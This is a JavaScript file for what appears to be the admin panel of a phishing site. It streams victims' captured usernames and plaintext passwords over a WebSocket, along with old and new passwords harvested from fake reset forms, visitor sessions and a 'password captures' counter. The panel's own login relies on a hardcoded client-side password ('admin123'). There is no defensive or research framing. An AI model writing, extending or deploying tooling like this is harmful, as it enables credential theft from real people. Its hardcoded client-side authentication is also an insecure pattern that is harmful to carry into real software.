(function () {
  // Configuration
  const isSecure = window.location.protocol === 'https:';
  const wsProtocol = isSecure ? 'wss:' : 'ws:';
  const WS_URL = `${wsProtocol}//${window.location.host}`;
  const ADMIN_PASSWORD = 'admin123'; // Change this to your desired password
  const AUTH_KEY = 'adminAuth';
  const AUTH_EXPIRY_HOURS = 24;
  
  let ws = null;
  let reconnectTimeout = null;

  // DOM elements
  const elements = {
    // Auth elements
    loginScreen: document.getElementById('loginScreen'),
    loginForm: document.getElementById('loginForm'),
    adminPassword: document.getElementById('adminPassword'),
    togglePassword: document.getElementById('togglePassword'),
    errorMessage: document.getElementById('errorMessage'),
    adminContainer: document.getElementById('adminContainer'),
    logoutBtn: document.getElementById('logoutBtn'),
    
    connectionStatus: document.getElementById('connectionStatus'),
    themeToggle: document.getElementById('themeToggle'),
    themeModal: document.getElementById('themeModal'),
    closeModal: document.getElementById('closeModal'),
    refreshBtn: document.getElementById('refreshBtn'),
    
    // Stats
    totalVisits: document.getElementById('totalVisits'),
    uniqueVisitors: document.getElementById('uniqueVisitors'),
    realtimeUsers: document.getElementById('realtimeUsers'),
    loginAttempts: document.getElementById('loginAttempts'),
    passwordCaptures: document.getElementById('passwordCaptures'),
    lastActivity: document.getElementById('lastActivity'),
    
    // Tables
    loginsTableBody: document.getElementById('loginsTableBody'),
    sessionsTableBody: document.getElementById('sessionsTableBody'),
    activityFeed: document.getElementById('activityFeed'),
    
    // Counts
    loginsCount: document.getElementById('loginsCount'),
    sessionsCount: document.getElementById('sessionsCount'),
    
    // Tabs
    tabBtns: document.querySelectorAll('.tab-btn'),
    tabContents: document.querySelectorAll('.tab-content'),
    
    // Other
    clearActivity: document.getElementById('clearActivity'),
    notificationContainer: document.getElementById('notificationContainer'),
  };

  // State
  const state = {
    logins: [],
    sessions: [],
    activityItems: [],
    isAuthenticated: false,
  };

  // Authentication Management
  const checkAuth = () => {
    const authData = localStorage.getItem(AUTH_KEY);
    if (!authData) return false;
    
    try {
      const { password, timestamp } = JSON.parse(authData);
      const now = Date.now();
      const expiry = AUTH_EXPIRY_HOURS * 60 * 60 * 1000;
      
      // Check if auth is expired
      if (now - timestamp > expiry) {
        localStorage.removeItem(AUTH_KEY);
        return false;
      }
      
      // Verify password (simple check)
      return password === btoa(ADMIN_PASSWORD);
    } catch (err) {
      localStorage.removeItem(AUTH_KEY);
      return false;
    }
  };

  const saveAuth = (password) => {
    const authData = {
      password: btoa(password),
      timestamp: Date.now(),
    };
    localStorage.setItem(AUTH_KEY, JSON.stringify(authData));
  };

  const clearAuth = () => {
    localStorage.removeItem(AUTH_KEY);
  };

  const showLoginScreen = () => {
    elements.loginScreen.style.display = 'flex';
    elements.adminContainer.style.display = 'none';
    state.isAuthenticated = false;
    
    // Disconnect WebSocket
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.close();
    }
  };

  const showAdminPanel = () => {
    elements.loginScreen.style.display = 'none';
    elements.adminContainer.style.display = 'block';
    state.isAuthenticated = true;
    
    // Connect WebSocket
    connectWebSocket();
  };

  const handleLogin = (e) => {
    e.preventDefault();
    
    const password = elements.adminPassword.value.trim();
    
    if (!password) {
      elements.errorMessage.textContent = 'Please enter a password';
      return;
    }
    
    if (password !== ADMIN_PASSWORD) {
      elements.errorMessage.textContent = 'Incorrect password. Please try again.';
      elements.adminPassword.value = '';
      elements.adminPassword.focus();
      return;
    }
    
    // Success!
    saveAuth(password);
    elements.errorMessage.textContent = '';
    elements.adminPassword.value = '';
    showAdminPanel();
    
    // Fetch initial data
    fetchInitialData();
  };

  const handleLogout = () => {
    if (confirm('Are you sure you want to logout?')) {
      clearAuth();
      showLoginScreen();
    }
  };

  // Password toggle
  elements.togglePassword.addEventListener('click', () => {
    const type = elements.adminPassword.type === 'password' ? 'text' : 'password';
    elements.adminPassword.type = type;
    elements.togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
  });

  // Login form
  elements.loginForm.addEventListener('submit', handleLogin);
  
  // Logout button
  elements.logoutBtn.addEventListener('click', handleLogout);

  // Theme Management
  const loadTheme = () => {
    const savedTheme = localStorage.getItem('adminTheme') || 'dark';
    document.body.setAttribute('data-theme', savedTheme);
  };

  const saveTheme = (theme) => {
    localStorage.setItem('adminTheme', theme);
    document.body.setAttribute('data-theme', theme);
  };

  elements.themeToggle.addEventListener('click', () => {
    elements.themeModal.classList.add('active');
  });

  elements.closeModal.addEventListener('click', () => {
    elements.themeModal.classList.remove('active');
  });

  elements.themeModal.addEventListener('click', (e) => {
    if (e.target === elements.themeModal) {
      elements.themeModal.classList.remove('active');
    }
  });

  document.querySelectorAll('.theme-option').forEach((btn) => {
    btn.addEventListener('click', () => {
      const theme = btn.getAttribute('data-theme');
      saveTheme(theme);
      elements.themeModal.classList.remove('active');
      showNotification('Theme Updated', `Switched to ${theme} theme`, 'success');
    });
  });

  // WebSocket Connection
  const updateConnectionStatus = (status) => {
    elements.connectionStatus.classList.remove('connected', 'disconnected');
    
    if (status === 'connected') {
      elements.connectionStatus.classList.add('connected');
      elements.connectionStatus.querySelector('.status-text').textContent = 'Connected';
    } else if (status === 'disconnected') {
      elements.connectionStatus.classList.add('disconnected');
      elements.connectionStatus.querySelector('.status-text').textContent = 'Disconnected';
    } else {
      elements.connectionStatus.querySelector('.status-text').textContent = 'Connecting...';
    }
  };

  const connectWebSocket = () => {
    try {
      ws = new WebSocket(WS_URL);

      ws.onopen = () => {
        console.log('WebSocket connected');
        updateConnectionStatus('connected');
        if (reconnectTimeout) {
          clearTimeout(reconnectTimeout);
          reconnectTimeout = null;
        }
      };

      ws.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          handleWebSocketMessage(data);
        } catch (err) {
          console.error('Error parsing WebSocket message:', err);
        }
      };

      ws.onerror = (error) => {
        console.error('WebSocket error:', error);
      };

      ws.onclose = () => {
        console.log('WebSocket disconnected');
        updateConnectionStatus('disconnected');
        
        // Attempt to reconnect after 3 seconds
        if (!reconnectTimeout) {
          reconnectTimeout = setTimeout(() => {
            console.log('Attempting to reconnect...');
            connectWebSocket();
          }, 3000);
        }
      };
    } catch (err) {
      console.error('Error creating WebSocket:', err);
      updateConnectionStatus('disconnected');
    }
  };

  const handleWebSocketMessage = (data) => {
    const { type } = data;

    switch (type) {
      case 'initial_data':
        handleInitialData(data);
        break;
      case 'analytics_update':
        handleAnalyticsUpdate(data);
        break;
      case 'login_captured':
        handleLoginCaptured(data);
        break;
      case 'password_reset_captured':
        handlePasswordResetCaptured(data);
        break;
      case 'user_left':
        handleUserLeft(data);
        break;
      default:
        console.log('Unknown message type:', type);
    }
  };

  const handleInitialData = (data) => {
    const { stats, recentLogins, activeSessions } = data;
    
    updateStats(stats);
    state.logins = recentLogins || [];
    state.sessions = activeSessions || [];
    
    renderLogins();
    renderSessions();
    
    addActivityItem('info', 'Dashboard initialized with existing data');
  };

  const handleAnalyticsUpdate = (data) => {
    const { event, stats } = data;
    
    updateStats(stats);
    updateLastActivity();
    
    if (event.type === 'page_view') {
      addActivityItem('info', `User ${formatClientId(event.clientId)} visited ${event.path}`);
    }
  };

  const handleLoginCaptured = (data) => {
    const { login, stats } = data;
    
    state.logins.unshift(login);
    if (state.logins.length > 50) {
      state.logins.pop();
    }
    
    updateStats(stats);
    renderLogins();
    updateLastActivity();
    
    addActivityItem('danger', `🔐 Login captured: ${login.username} / ${login.password}`);
    showNotification('Login Captured!', `Username: ${login.username}`, 'danger');
  };

  const handlePasswordResetCaptured = (data) => {
    const { reset, stats } = data;
    
    state.logins.unshift(reset);
    if (state.logins.length > 50) {
      state.logins.pop();
    }
    
    updateStats(stats);
    renderLogins();
    updateLastActivity();
    
    addActivityItem('warning', `🔄 Password Reset: ${reset.username} - Old: ${reset.currentPassword} → New: ${reset.newPassword}`);
    showNotification('Password Reset Captured!', `User: ${reset.username}`, 'warning');
  };

  const handleUserLeft = (data) => {
    const { clientId, stats } = data;
    
    updateStats(stats);
    addActivityItem('warning', `👋 User ${formatClientId(clientId)} left the site`);
  };

  // Update Stats
  const updateStats = (stats) => {
    if (!stats) return;
    
    elements.totalVisits.textContent = stats.totalVisits || 0;
    elements.uniqueVisitors.textContent = stats.uniqueVisitors || 0;
    elements.realtimeUsers.textContent = stats.realtimeUsers || 0;
    elements.loginAttempts.textContent = stats.loginAttempts || 0;
    elements.passwordCaptures.textContent = stats.passwordCaptures || 0;
  };

  const updateLastActivity = () => {
    const now = new Date();
    const timeStr = now.toLocaleTimeString();
    elements.lastActivity.textContent = timeStr;
  };

  // Render Tables
  const renderLogins = () => {
    elements.loginsCount.textContent = state.logins.length;
    
    if (state.logins.length === 0) {
      elements.loginsTableBody.innerHTML = `
        <tr class="empty-state">
          <td colspan="5">Waiting for login captures...</td>
        </tr>
      `;
      return;
    }
    
    elements.loginsTableBody.innerHTML = state.logins
      .map((item, index) => {
        const timestamp = new Date(item.timestamp).toLocaleString();
        const isNew = index === 0;
        const isReset = item.type === 'password_reset' || item.newPassword;
        
        if (isReset) {
          // Password reset entry
          return `
            <tr class="${isNew ? 'new-entry' : ''}" style="background: var(--bg-hover);">
              <td class="timestamp">\ud83d\udd04 ${timestamp}</td>
              <td class="username">${escapeHtml(item.username)}</td>
              <td class="password">
                Old: <span style="color: var(--color-danger);">${escapeHtml(item.currentPassword)}</span><br>
                New: <span style="color: var(--color-warning);">${escapeHtml(item.newPassword)}</span>
              </td>
              <td class="client-id">${formatClientId(item.clientId)}</td>
              <td style="font-size: 11px; color: var(--text-muted);">${escapeHtml(item.userAgent || 'N/A')}</td>
            </tr>
          `;
        } else {
          // Regular login entry
          return `
            <tr class="${isNew ? 'new-entry' : ''}">
              <td class="timestamp">${timestamp}</td>
              <td class="username">${escapeHtml(item.username)}</td>
              <td class="password">${escapeHtml(item.password)}</td>
              <td class="client-id">${formatClientId(item.clientId)}</td>
              <td style="font-size: 11px; color: var(--text-muted);">${escapeHtml(item.userAgent || 'N/A')}</td>
            </tr>
          `;
        }
      })
      .join('');
  };

  const renderSessions = () => {
    elements.sessionsCount.textContent = state.sessions.length;
    
    if (state.sessions.length === 0) {
      elements.sessionsTableBody.innerHTML = `
        <tr class="empty-state">
          <td colspan="6">No active sessions</td>
        </tr>
      `;
      return;
    }
    
    elements.sessionsTableBody.innerHTML = state.sessions
      .map((session) => {
        const firstSeen = new Date(session.firstSeen).toLocaleTimeString();
        const lastSeen = new Date(session.lastSeen).toLocaleTimeString();
        const duration = Math.floor((session.lastSeen - session.firstSeen) / 1000);
        const durationStr = formatDuration(duration);
        
        return `
          <tr>
            <td class="client-id">${formatClientId(session.clientId)}</td>
            <td class="timestamp">${firstSeen}</td>
            <td class="timestamp">${lastSeen}</td>
            <td style="color: var(--color-success);">${durationStr}</td>
            <td style="color: var(--color-info);">${session.pageCount}</td>
            <td style="color: var(--text-secondary);">${escapeHtml(session.lastPage)}</td>
          </tr>
        `;
      })
      .join('');
  };

  // Activity Feed
  const addActivityItem = (type, message) => {
    const now = new Date();
    const timeStr = now.toLocaleTimeString();
    
    const item = {
      type,
      message,
      time: timeStr,
      timestamp: Date.now(),
    };
    
    state.activityItems.unshift(item);
    if (state.activityItems.length > 100) {
      state.activityItems.pop();
    }
    
    renderActivityFeed();
  };

  const renderActivityFeed = () => {
    elements.activityFeed.innerHTML = state.activityItems
      .map((item) => {
        return `
          <div class="activity-item activity-${item.type}">
            <div class="activity-time">${item.time}</div>
            <div class="activity-content">${escapeHtml(item.message)}</div>
          </div>
        `;
      })
      .join('');
  };

  elements.clearActivity.addEventListener('click', () => {
    state.activityItems = [];
    renderActivityFeed();
    addActivityItem('info', 'Activity feed cleared');
  });

  // Notifications
  const showNotification = (title, message, type = 'info') => {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
      <div class="notification-title">${escapeHtml(title)}</div>
      <div class="notification-message">${escapeHtml(message)}</div>
    `;
    
    elements.notificationContainer.appendChild(notification);
    
    setTimeout(() => {
      notification.style.opacity = '0';
      notification.style.transform = 'translateX(100%)';
      setTimeout(() => {
        notification.remove();
      }, 300);
    }, 5000);
  };

  // Tabs
  elements.tabBtns.forEach((btn) => {
    btn.addEventListener('click', () => {
      const tabName = btn.getAttribute('data-tab');
      
      // Update buttons
      elements.tabBtns.forEach((b) => b.classList.remove('active'));
      btn.classList.add('active');
      
      // Update content
      elements.tabContents.forEach((content) => {
        content.classList.remove('active');
      });
      
      const targetTab = document.getElementById(`${tabName}Tab`);
      if (targetTab) {
        targetTab.classList.add('active');
      }
    });
  });

  // Refresh
  elements.refreshBtn.addEventListener('click', async () => {
    elements.refreshBtn.textContent = '⟳ Refreshing...';
    elements.refreshBtn.disabled = true;
    
    try {
      const response = await fetch('/admin/stats');
      const data = await response.json();
      
      updateStats(data.stats);
      state.logins = data.recentLogins || [];
      state.sessions = data.activeSessions || [];
      
      renderLogins();
      renderSessions();
      
      addActivityItem('success', 'Dashboard data refreshed');
      showNotification('Refreshed', 'Dashboard data updated', 'success');
    } catch (err) {
      console.error('Error refreshing data:', err);
      showNotification('Error', 'Failed to refresh data', 'danger');
    } finally {
      elements.refreshBtn.textContent = '🔄 Refresh';
      elements.refreshBtn.disabled = false;
    }
  });

  // Utility Functions
  const escapeHtml = (text) => {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  };

  const formatClientId = (clientId) => {
    if (!clientId) return 'unknown';
    return clientId.length > 12 ? clientId.substring(0, 12) + '...' : clientId;
  };

  const formatDuration = (seconds) => {
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    if (minutes < 60) return `${minutes}m ${secs}s`;
    const hours = Math.floor(minutes / 60);
    const mins = minutes % 60;
    return `${hours}h ${mins}m`;
  };

  // Auto-update sessions every 30 seconds
  setInterval(async () => {
    if (ws && ws.readyState === WebSocket.OPEN && state.isAuthenticated) {
      try {
        const response = await fetch('/admin/stats');
        const data = await response.json();
        state.sessions = data.activeSessions || [];
        renderSessions();
      } catch (err) {
        console.error('Error updating sessions:', err);
      }
    }
  }, 30000);

  // Fetch initial data
  const fetchInitialData = () => {
    fetch('/admin/stats')
      .then((response) => response.json())
      .then((data) => {
        updateStats(data.stats);
        state.logins = data.recentLogins || [];
        state.sessions = data.activeSessions || [];
        renderLogins();
        renderSessions();
      })
      .catch((err) => {
        console.error('Error fetching initial data:', err);
      });
  };

  // Initialize
  const init = () => {
    loadTheme();
    updateLastActivity();
    
    // Check authentication
    if (checkAuth()) {
      showAdminPanel();
      fetchInitialData();
    } else {
      showLoginScreen();
      elements.adminPassword.focus();
    }
    
    console.log('Admin dashboard initialized');
  };

  // Start
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
